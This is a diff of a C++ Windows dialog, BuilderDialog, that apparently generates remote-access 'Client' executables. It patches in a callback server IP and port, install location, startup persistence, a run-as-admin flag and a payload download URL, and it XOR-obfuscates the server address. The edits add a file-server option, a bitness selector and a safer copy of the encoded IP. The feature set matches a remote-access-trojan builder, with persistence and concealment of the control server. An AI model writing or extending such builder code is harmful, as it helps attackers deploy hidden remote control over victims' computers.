@@ -5,16 +5,30 @@
 // 编码: UTF-8 BOM
 //================================================================================
 
+#ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN
+#endif
+
+#include <winsock2.h>
+#include <windows.h>
 #include "BuilderDialog.h"
 #include "../GlobalState.h"
-#include "../StringUtils.h"
 #include "../NetworkHelper.h"
 #include "../resource.h"
 #include "../../Common/Config.h"
-#include "../Utils/StringHelper.h"
 #include <CommDlg.h>
 #include <string>
 #include <vector>
+
+// 使用 Windows API 风格的字符串转换，避免 CRT 冲突
+static std::string WideToUTF8(const std::wstring& wstr) {
+    if (wstr.empty()) return "";
+    int len = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
+    if (len <= 0) return "";
+    std::string result(len - 1, 0);
+    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], len, nullptr, nullptr);
+    return result;
+}
 
 INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
     switch (message) {
@@ -113,14 +127,15 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
                 HWND hCombo = (HWND)lParam;
                 int index = (int)SendMessageW(hCombo, CB_GETCURSEL, 0, 0);
                 // 只有选择"下载"或"远程加载"时才启用下载地址输入
-                EnableWindow(GetDlgItem(hDlg, IDC_EDIT_DOWNLOAD_URL), index == 1 || index == 2);
+                BOOL enableDownload = (index == 1 || index == 2) || IsDlgButtonChecked(hDlg, IDC_CHECK_FILESERVER);
+                EnableWindow(GetDlgItem(hDlg, IDC_EDIT_DOWNLOAD_URL), enableDownload);
             }
             return (INT_PTR)TRUE;
         }
-        if (LOWORD(wParam) == IDC_CHECK_BOTH) {
-            BOOL isBoth = IsDlgButtonChecked(hDlg, IDC_CHECK_BOTH);
-            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_X86), !isBoth);
-            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_X64), !isBoth);
+        if (LOWORD(wParam) == IDC_CHECK_FILESERVER) {
+            int index = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_PAYLOAD), CB_GETCURSEL, 0, 0);
+            BOOL enableDownload = (index == 1 || index == 2) || IsDlgButtonChecked(hDlg, IDC_CHECK_FILESERVER);
+            EnableWindow(GetDlgItem(hDlg, IDC_EDIT_DOWNLOAD_URL), enableDownload);
             return (INT_PTR)TRUE;
         }
         if (LOWORD(wParam) == IDCANCEL) {
@@ -141,12 +156,12 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
                 return (INT_PTR)TRUE;
             }
 
-            std::string ip = Formidable::Utils::StringHelper::WideToUTF8(wIP);
-            std::string port = Formidable::Utils::StringHelper::WideToUTF8(wPort);
-            std::string group = Formidable::Utils::StringHelper::WideToUTF8(wGroup);
-            std::string installDir = Formidable::Utils::StringHelper::WideToUTF8(wInstallDir);
-            std::string installName = Formidable::Utils::StringHelper::WideToUTF8(wInstallName);
-            std::string downloadUrl = Formidable::Utils::StringHelper::WideToUTF8(wDownloadUrl);
+            std::string ip = WideToUTF8(wIP);
+            std::string port = WideToUTF8(wPort);
+            std::string group = WideToUTF8(wGroup);
+            std::string installDir = WideToUTF8(wInstallDir);
+            std::string installName = WideToUTF8(wInstallName);
+            std::string downloadUrl = WideToUTF8(wDownloadUrl);
             
             int runTypeIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_RUN_TYPE), CB_GETCURSEL, 0, 0);
             int protocolIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_PROTOCOL), CB_GETCURSEL, 0, 0);
@@ -155,8 +170,9 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
             
             bool runAsAdmin = (IsDlgButtonChecked(hDlg, IDC_CHECK_ADMIN) == BST_CHECKED);
             bool startup = (IsDlgButtonChecked(hDlg, IDC_CHECK_STARTUP) == BST_CHECKED);
-            bool buildBoth = (IsDlgButtonChecked(hDlg, IDC_CHECK_BOTH) == BST_CHECKED);
-            bool is64Bit = (IsDlgButtonChecked(hDlg, IDC_RADIO_X64) == BST_CHECKED); // 检查单选框状态
+            int bitsIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_BITS), CB_GETCURSEL, 0, 0);
+            bool buildBoth = (bitsIndex == 2);
+            bool is64Bit = (bitsIndex == 1);
             bool encryptIp = (IsDlgButtonChecked(hDlg, IDC_CHECK_ENCRYPT_IP) == BST_CHECKED);
 
             // 如果选择了 Both，则忽略 is64Bit 手动选择的结果，直接循环两次
@@ -190,10 +206,10 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
                     std::wstring currentDir = szExePath;
                     currentDir = currentDir.substr(0, currentDir.find_last_of(L"\\/"));
                     
-                    std::wstring clientPath = currentDir + (x64 ? L"\\Client_x64.exe" : L"\\Client_x86.exe");
+                    std::wstring clientPath = currentDir + (x64 ? L"\\x64\\Client.exe" : L"\\x86\\Client.exe");
                     // 尝试在上一级目录找
                     if (GetFileAttributesW(clientPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
-                        clientPath = currentDir + (x64 ? L"\\..\\Client_x64.exe" : L"\\..\\Client_x86.exe");
+                        clientPath = currentDir + (x64 ? L"\\..\\x64\\Client.exe" : L"\\..\\x86\\Client.exe");
                     }
                     
                     HANDLE hFile = CreateFileW(clientPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -227,14 +243,19 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
                         memset(pAddr->szDownloadUrl, 0, sizeof(pAddr->szDownloadUrl));
                         
                         // 填入配置
-                        std::string finalIp = ip;
                         if (encryptIp) {
+                            std::string finalIp = ip;
                             for (size_t k = 0; k < finalIp.length(); k++) {
                                 finalIp[k] ^= 0x5A; // 简单的异或加密
                             }
+                            // 对于加密数据，必须使用 memcpy 以免被 null 截断
+                            size_t copyLen = (finalIp.length() < sizeof(pAddr->szServerIP) - 1) ? finalIp.length() : sizeof(pAddr->szServerIP) - 1;
+                            memcpy(pAddr->szServerIP, finalIp.c_str(), copyLen);
+                            pAddr->szServerIP[copyLen] = '\0';
+                        } else {
+                            strncpy_s(pAddr->szServerIP, sizeof(pAddr->szServerIP), ip.c_str(), _TRUNCATE);
                         }
-
-                        strncpy_s(pAddr->szServerIP, sizeof(pAddr->szServerIP), finalIp.c_str(), _TRUNCATE);
+                        
                         strncpy_s(pAddr->szPort, sizeof(pAddr->szPort), port.c_str(), _TRUNCATE);
                         strncpy_s(pAddr->szGroupName, sizeof(pAddr->szGroupName), group.c_str(), _TRUNCATE);
                         strncpy_s(pAddr->szInstallDir, sizeof(pAddr->szInstallDir), installDir.c_str(), _TRUNCATE);
